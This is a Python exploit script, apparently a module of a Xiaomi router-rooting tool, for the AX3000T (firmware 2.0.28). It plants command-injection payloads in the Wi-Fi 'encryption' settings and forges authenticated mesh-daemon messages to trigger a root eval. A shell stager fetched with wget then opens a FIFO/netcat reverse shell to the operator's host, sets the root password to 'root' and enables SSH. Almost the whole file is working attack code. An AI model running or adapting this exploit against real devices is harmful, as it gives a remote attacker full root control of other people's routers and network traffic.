#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import hashlib
import hmac
import http.server
import json
import random
import re
import socket
import socketserver
import ssl
import string
import struct
import sys
import threading
import time

import xmir_base
from gateway import *

# Devices:
# RD03v2  FW 2.0.28   Router AX3000T   (tested on hardware)
#
# This is the vector that survives hackCheck v3. Everything else in this tool is
# a web-API injection, and on 2.0.x the web API filters those; `encryption` is on
# the filter's exemption list, and the sink itself is reached through a native
# daemon on its own socket, which the Lua filter never had in scope.

web_password = False

try:
    gw = inited_gw
except NameError:
    gw = create_gateway(die_if_sshOk = False, web_login = web_password)


MESH_PORT = 19553
MESH_KEY = b"838d364d8ed3bd085e150211ea6b3715"
MESH_VER = 0x1001
MESH_HDR = 0x2c

HTTP_PORT = 8090      # serves the stager the root eval fetches
SHELL_PORT = 4444     # the device dials back here for a root command channel

REPAIR_ITERS = 40     # cap_init rewrites the radios shortly after the eval, so
REPAIR_INTERVAL = 5   # the repair loop watches for ~200s rather than fixing once


# ---- stager -----------------------------------------------------------------
#
# Runs as root, inside cap_init, in the window the eval gives us. Rendered by
# token replacement rather than str.format so the shell's own ${...} and
# $((...)) need no escaping.

STAGER = r'''#!/bin/sh
export PATH=/usr/sbin:/usr/bin:/sbin:/bin:$PATH
A=@@ATTACKER@@
HP=@@HTTP_PORT@@
SP=@@SHELL_PORT@@
STOP=/tmp/.xmir_chan_stop

rm -f $STOP
wget -q -O /dev/null "http://$A:$HP/pwned?uid=$(id -u)_user=$(id -un)_host=$(uname -n)" 2>/dev/null

# Put the radios back the way we found them.  cap_init writes its wireless
# config AFTER this eval returns, so the repair has to watch and correct rather
# than fix once.  Both poisoned values are recognisable by content, which is how
# each section is matched to the band it came from.  This loop is deliberately
# self-expiring and is NOT stopped early by the caller: cutting it short before
# cap_init writes would leave an AP nobody can join.
(
  i=0
  while [ $i -lt @@REPAIR_ITERS@@ ]; do
    i=$((i+1)); sleep @@REPAIR_INTERVAL@@
    changed=0
    for s in $(uci show wireless 2>/dev/null | sed -n 's/^wireless\.\([^.]*\)=wifi-iface$/\1/p'); do
      e=$(uci -q get wireless.$s.encryption 2>/dev/null)
      case "$e" in
        *wget*)
          uci -q set wireless.$s.encryption='@@ENC24@@'
          @@KEY24@@
          changed=1 ;;
        *"sh /tmp"*)
          uci -q set wireless.$s.encryption='@@ENC5@@'
          @@KEY5@@
          changed=1 ;;
      esac
    done
    [ "$changed" = 1 ] && { uci -q commit wireless; wifi reload; }
  done
) &

# Durable root command channel.  Non-interactive sh, so there is no prompt to
# parse; the caller terminates every command with its own marker.  Dialling out
# and reconnecting is the point: cap_init takes the radios down by design, so a
# device-side listener would need the caller to reconnect at exactly the moment
# the radios settle.
(
  while [ ! -f $STOP ]; do
    rm -f /tmp/.ch; mkfifo /tmp/.ch 2>/dev/null
    /bin/sh < /tmp/.ch 2>&1 | nc $A $SP > /tmp/.ch
    sleep 5
  done
  rm -f /tmp/.ch /tmp/x
) &
'''


def build_stager(attacker, bands, repair_iters = REPAIR_ITERS,
                 repair_interval = REPAIR_INTERVAL):
    """Render the stager with the pre-plant radio values baked in.

    `bands` is what read_wifi() captured before the plant. A factory unit
    reports an open AP, and `none` is the one configuration that is always
    joinable -- which is what matters when Wi-Fi is the only link.
    """
    def band(i):
        b = bands[i] if len(bands) > i else {}
        enc = (b.get('encryption') or 'none').strip()
        pw = (b.get('password') or '').strip()
        if enc in ('', 'none', 'None'):
            return 'none', 'uci -q delete wireless.$s.key 2>/dev/null'
        # set_wifi_without_restart already wrote our own pwd= into .key, so
        # falling back to it keeps the AP joinable with a key we know.
        return enc, f"uci -q set wireless.$s.key='{pw or 'meshpoc12345'}'"

    enc24, key24 = band(0)
    enc5, key5 = band(1)
    return (STAGER
            .replace('@@ATTACKER@@', attacker)
            .replace('@@HTTP_PORT@@', str(HTTP_PORT))
            .replace('@@SHELL_PORT@@', str(SHELL_PORT))
            .replace('@@REPAIR_ITERS@@', str(repair_iters))
            .replace('@@REPAIR_INTERVAL@@', str(repair_interval))
            .replace('@@ENC24@@', enc24)
            .replace('@@KEY24@@', key24)
            .replace('@@ENC5@@', enc5)
            .replace('@@KEY5@@', key5)).encode()


def expected_wifi(gw, bands):
    """What the operator has to rejoin once the radios settle. Printed before
    the trigger, because after it the link drops."""
    out = []
    for i, name in ((0, '2.4G'), (1, '5G')):
        b = bands[i] if len(bands) > i else {}
        enc = (b.get('encryption') or 'none').strip()
        key = (b.get('password') or '').strip() or 'meshpoc12345'
        out.append((name, b.get('ssid', '?'),
                    'open' if enc in ('', 'none', 'None') else f'{enc} key={key}'))
    return out


# ---- mesh: auth + the type-7 that fires cap_init ----------------------------


def mesh_pass(ident):
    ######
    # vuln/exploit author: Adriel Santos
    # publication: https://github.com/ADCDS/xiaomi-ax3000t-cabmeshd-disclosure
    ######
    # A server (CAP) verifies an INCOMING peer with the 'q' role byte; 'x' is
    # what a CAP sends for the auth it originates.
    return base64.b64encode(hmac.new(b'q' + MESH_KEY[1:], ident, hashlib.sha256).digest())


def mesh_hdr(typ, blen):
    h = bytearray(MESH_HDR)
    h[0:2] = struct.pack('>H', MESH_VER)
    h[2:4] = struct.pack('>H', blen)
    h[4:6] = struct.pack('>H', typ)
    return bytes(h)


def mesh_connect(ip_addr, timeout = 20, retries = 4):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers('ALL:@SECLEVEL=0')
    except ssl.SSLError:
        pass
    for attempt in range(retries):
        try:
            return ctx.wrap_socket(socket.create_connection((ip_addr, MESH_PORT), timeout = timeout))
        except (TimeoutError, socket.timeout, ssl.SSLError, OSError) as e:
            if attempt == retries - 1:
                raise ExploitNotWorked(
                    f'Cannot open TLS session to {ip_addr}:{MESH_PORT} ({type(e).__name__})')
            print(f'WARN: cab_meshd slot busy ({type(e).__name__}), retry {attempt + 2}/{retries}')
            time.sleep(15)


def trigger_cap_init(ip_addr, ident = b'xmir0001', settle = 4.0):
    ######
    # vuln/exploit author: Adriel Santos
    # publication: https://github.com/ADCDS/xiaomi-ax3000t-cabmeshd-disclosure
    ######
    """type-4 -> type-5 -> type-7. cap_init reads the poisoned UCI values and
    hands them to mimesh_init.sh's eval, as root.

    ONE-SHOT: cap_init persists NETMODE=whc_cap, which gates the sink until a
    factory reset. Everything the payload will ever do, it does now -- so this
    must never be called before the plant has been read back and confirmed.
    """
    sock = mesh_connect(ip_addr)
    print(f'Connected to cab_meshd on port {MESH_PORT} ({sock.version()})')

    b4 = bytearray(0xa4)
    b4[0:len(ident)] = ident
    p = mesh_pass(ident)
    b4[0x10:0x10 + len(p)] = p
    sock.sendall(mesh_hdr(4, len(b4)) + bytes(b4))
    print('type-4 auth sent')

    time.sleep(1.0)
    b5 = bytearray(0x20)
    b5[0] = 1
    sock.sendall(mesh_hdr(5, len(b5)) + bytes(b5))
    print('type-5 sent -> ST_RUNNING')

    time.sleep(1.5)
    sock.settimeout(2.0)
    try:
        sock.recv(4096)
    except (socket.timeout, ssl.SSLWantReadError, OSError):
        pass

    b7 = bytearray(0x110)
    b7[0] = 1
    sock.sendall(mesh_hdr(7, len(b7)) + bytes(b7))
    print('type-7 sent -> cap_init -> mimesh_init eval (root)')

    time.sleep(settle)
    try:
        sock.close()
    except OSError:
        pass


# ---- local plumbing ---------------------------------------------------------


def local_ip(ip_addr):
    """Source address this machine uses to reach the router -- the address the
    device will call back to, so it is baked into the stager at plant time."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((ip_addr, 80))
        return s.getsockname()[0]
    finally:
        s.close()


class _StagerHandler(http.server.BaseHTTPRequestHandler):
    stager = b''
    callback = None       # threading.Event
    callback_path = []    # list, so the handler can hand the text back

    def log_message(self, fmt, *a):
        pass

    def do_GET(self):
        if self.path.startswith('/pwned'):
            print(f'    [+] ROOT CALLBACK: {self.path}')
            type(self).callback_path.append(self.path)
            type(self).callback.set()
            self._reply(b'ok')
            return
        if self.path == '/s' or self.path.startswith('/s?'):
            self._reply(self.stager, 'application/octet-stream')
            return
        self.send_response(404)
        self.end_headers()

    def _reply(self, body, ctype = 'text/plain'):
        self.send_response(200)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class StagerServer:
    def __init__(self, port, stager):
        _StagerHandler.stager = stager
        _StagerHandler.callback = threading.Event()
        _StagerHandler.callback_path = []
        socketserver.TCPServer.allow_reuse_address = True
        self.httpd = socketserver.ThreadingTCPServer(('0.0.0.0', port), _StagerHandler)
        threading.Thread(target = self.httpd.serve_forever, daemon = True).start()
        print(f'http :{port} serving /s ({len(stager)} B)')

    @property
    def callback(self):
        return _StagerHandler.callback

    def stop(self):
        try:
            self.httpd.shutdown()
        except Exception:
            pass


class ShellChannel:
    """A root /bin/sh the device dials back to, driven command-at-a-time.

    Reconnects are expected (the Wi-Fi bounce, and the stager's retry loop), so
    the accept loop keeps the newest connection and run() waits for one to
    exist. Each connection is a fresh shell, so commands must be self-contained.
    """

    def __init__(self, port):
        self.sock = None
        self.lock = threading.Lock()
        self.connected = threading.Event()
        self.marker = '__XMIR_' + ''.join(
            random.choice(string.ascii_uppercase) for _ in range(8)) + '_'
        self._buf = b''
        self._seq = 0
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind(('0.0.0.0', port))
        self._srv.listen(4)
        threading.Thread(target = self._accept_loop, daemon = True).start()
        print(f'root shell channel listening on :{port}')

    def _accept_loop(self):
        while True:
            try:
                c, addr = self._srv.accept()
            except OSError:
                return
            with self.lock:
                if self.sock is not None:
                    try:
                        self.sock.close()
                    except OSError:
                        pass
                c.settimeout(None)
                self.sock = c
                self._buf = b''
                self.connected.set()
            print(f'[+] root shell connected from {addr[0]}:{addr[1]}')

    def wait(self, timeout = 180):
        return self.connected.wait(timeout)

    def _drop(self):
        with self.lock:
            if self.sock is not None:
                try:
                    self.sock.close()
                except OSError:
                    pass
            self.sock = None
            self._buf = b''
            self.connected.clear()

    def run(self, cmd, timeout = 120, retries = 1, quiet = False):
        """Send one shell command; return (rc, output)."""
        last = None
        for attempt in range(retries + 1):
            if not self.connected.wait(timeout = 60):
                last = TimeoutError('no shell connection')
                continue
            try:
                return self._run_once(cmd, timeout, quiet)
            except (OSError, TimeoutError) as e:
                last = e
                print(f'    (shell dropped during {cmd[:40]!r}: {type(e).__name__})')
                self._drop()
                time.sleep(3)
        raise ExploitNotWorked(f'root command failed after {retries + 1} attempts: {last}')

    def _run_once(self, cmd, timeout, quiet):
        self._seq += 1
        mark = f'{self.marker}{self._seq}:'
        line = f'{cmd}\necho "{mark}$?"\n'.encode()
        with self.lock:
            sock = self.sock
            if sock is None:
                raise OSError('no connection')
            sock.sendall(line)
        pat = re.compile(re.escape(mark).encode() + rb'(\d+)')
        deadline = time.time() + timeout
        while True:
            m = pat.search(self._buf)
            if m:
                out = self._buf[:m.start()]
                self._buf = self._buf[m.end():].lstrip(b'\r\n')
                rc = int(m.group(1))
                text = out.decode('utf-8', 'replace').strip('\r\n')
                if not quiet:
                    print(f'    $ {cmd[:70]}{"..." if len(cmd) > 70 else ""} -> rc={rc}')
                return rc, text
            if time.time() > deadline:
                raise TimeoutError(f'no marker within {timeout}s for: {cmd[:60]}')
            with self.lock:
                sock = self.sock
            if sock is None:
                raise OSError('connection lost')
            sock.settimeout(5.0)
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                raise OSError('connection closed')
            self._buf += chunk

    def close(self):
        self._drop()
        try:
            self._srv.close()
        except OSError:
            pass


# ---- the web-API half: read the radios, plant, verify -----------------------


def read_wifi(gw):
    """Current radio config, captured before planting so the stager can put it
    back. cap_init reconfigures the AP from the values we are about to poison,
    so without this the box comes back with a Wi-Fi nobody knows the key to --
    on a Wi-Fi-only connection that is a lost device."""
    info = gw.api_request('API/xqnetwork/wifi_detail_all', resp = 'json', timeout = 8)
    bands = []
    for w in (info or {}).get('info', []):
        bands.append({
            'ifname': w.get('ifname', ''),
            'ssid': w.get('ssid', ''),
            'encryption': w.get('encryption', ''),
            'password': w.get('password', ''),
            'channel': w.get('channelInfo', {}).get('channel', ''),
        })
    return bands


def plant(gw, attacker_ip, bands):
    """Write the two-stage payload into the 2.4/5 GHz `encryption` keys.

    set_wifi_without_restart writes UCI without bouncing the radios, so the
    device stays reachable between the plant and the trigger. The SSID is
    re-submitted unchanged so nothing visible changes.
    """
    ssid24 = bands[0]['ssid'] if len(bands) > 0 else 'MiWiFi'
    ssid5 = bands[1]['ssid'] if len(bands) > 1 else ssid24
    print(f'SSIDs preserved: 2.4G={ssid24!r} 5G={ssid5!r}')

    p_fetch = f'\\" wget http://{attacker_ip}:{HTTP_PORT}/s -O /tmp/x #'
    p_exec = '\\" sh /tmp/x #'

    r1 = gw.api_request('API/xqnetwork/set_wifi_without_restart',
                        {'wifiIndex': '1', 'ssid': ssid24, 'pwd': 'meshpoc12345',
                         'encryption': p_fetch}, post = 'x-www-form', resp = 'json', timeout = 10)
    print(f'2.4G encryption planted -> {r1}')
    r2 = gw.api_request('API/xqnetwork/set_wifi_without_restart',
                        {'wifiIndex': '2', 'ssid': ssid5, 'pwd': 'meshpoc12345',
                         'encryption': p_exec}, post = 'x-www-form', resp = 'json', timeout = 10)
    print(f'5G encryption planted   -> {r2}')


def verify_plant(gw):
    """Read the payloads back. This is the gate on the one-shot trigger: if the
    filter ate them, firing would burn the only shot for nothing."""
    seen = 0
    for w in (gw.api_request('API/xqnetwork/wifi_detail_all', resp = 'json', timeout = 8) or {}).get('info', []):
        enc = w.get('encryption', '')
        if 'wget' in enc or 'sh /tmp' in enc:
            seen += 1
            print(f'read-back ok: encryption={enc!r}')
    return seen


# =============================================================================

if gw.status < 1:
    die(f"Xiaomi Mi Wi-Fi device not found (IP: {gw.ip_addr})")

if not gw.stok:
    raise ExploitNotWorked('Exploit "cap_init" not working!!! '
                           '(no admin session -- a WEB password or connect8 is required)')

# The trigger is ONE-SHOT, so check it is armed before touching anything.  The
# first cap_init persists NETMODE=whc_cap, and do_cap_init skips its whole
# payload block -- including the mimesh_init eval -- when NETMODE is already
# whc_cap.  Firing a spent unit therefore looks exactly like a broken exploit:
# the plant succeeds, the trigger is accepted, and nothing ever dials back.
# Say which one it is instead of planting a payload that cannot run.
netmode_resp = gw.api_request('API/xqnetwork/get_netmode')
netmode = (netmode_resp or {}).get('netmode')
if netmode == 4:
    raise ExploitNotWorked(
        'Exploit "cap_init" not working!!! (unit is DISARMED: NETMODE=whc_cap. '
        'A previous cap_init consumed the one-shot and the sink stays gated '
        'until the device is factory reset. Reset it to re-arm, then re-run.)')
print(f'netmode = {netmode} (armed)')

dn = gw.device_name
print(f"device_name = {dn}")
print(f"rom_version = {gw.rom_version} {gw.rom_channel}")
print(f"mac_address = {gw.mac_address}")

print('')
print('Read the current radio config (needed to repair it after the trigger) ...')
bands = read_wifi(gw)
if len(bands) < 2:
    raise ExploitNotWorked(f'Exploit "cap_init" not working!!! '
                           f'(expected 2 radios, got {len(bands)})')
for i, name in ((0, '2.4G'), (1, '5G')):
    print(f"  {name}: ssid={bands[i]['ssid']!r} encryption={bands[i]['encryption']!r}")

attacker_ip = local_ip(gw.ip_addr)
if not attacker_ip:
    raise ExploitNotWorked('Exploit "cap_init" not working!!! (cannot determine local IP)')
print(f'operator address seen by the device: {attacker_ip}')
print('NOTE: this address is baked into the payload and must not change -- the')
print('      radios drop during the trigger, and the device reconnects to it.')

stager = build_stager(attacker_ip, bands)
http = StagerServer(HTTP_PORT, stager)
shell = ShellChannel(SHELL_PORT)

try:
    print('')
    print('Plant the payload ...')
    plant(gw, attacker_ip, bands)

    seen = verify_plant(gw)
    if seen < 2:
        raise ExploitNotWorked(
            f'Exploit "cap_init" not working!!! only {seen}/2 payloads survived '
            'read-back (the web filter may have stripped them); NOT firing the '
            'trigger, it is one-shot')

    print('')
    print('The radios will bounce. To rejoin afterwards:')
    for name, ssid, how in expected_wifi(gw, bands):
        print(f'  {name}: ssid={ssid!r} {how}')

    print('')
    print('Fire the trigger ...')
    trigger_cap_init(gw.ip_addr)

    print('')
    print('Waiting for the root channel ...')
    if not shell.wait(timeout = 180):
        raise ExploitNotWorked('Exploit "cap_init" not working!!! '
                               '(no root shell dialled back)')
    if http.callback.wait(timeout = 5):
        print(f'root proof callback: {_StagerHandler.callback_path[-1] if _StagerHandler.callback_path else "?"}')

    def exec_cmd(cmd, timeout = 60):
        rc, out = shell.run(cmd, timeout = timeout, retries = 1, quiet = True)
        return out if rc == 0 else None

    print('')
    print('Enable the SSH server ...')
    exec_cmd("sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
    exec_cmd("nvram set ssh_en=1 ; nvram set boot_wait=on ; nvram set bootdelay=3 ; nvram commit")
    exec_cmd("echo -e 'root\\nroot' > /tmp/psw.txt ; passwd root < /tmp/psw.txt")
    exec_cmd("/etc/init.d/dropbear enable")
    print('Run SSH server on port 22 ...')
    exec_cmd("/etc/init.d/dropbear restart")
    exec_cmd("logger -t XMiR ___completed___")

    time.sleep(0.5)
    gw.post_connect(exec_cmd)

    # Stop the command channel. The stager's loop removes its own fifo and the
    # fetched payload once it sees the flag, so there is nothing else to clear.
    # The Wi-Fi repair loop is deliberately left to expire on its own --
    # cap_init's rewrite may still be pending, and cutting it short would leave
    # the AP sitting on the poisoned values.
    print('Clean up the device-side channel ...')
    try:
        exec_cmd('rm -f /tmp/psw.txt ; touch /tmp/.xmir_chan_stop', timeout = 15)
    except ExploitNotWorked:
        pass
finally:
    shell.close()
    http.stop()
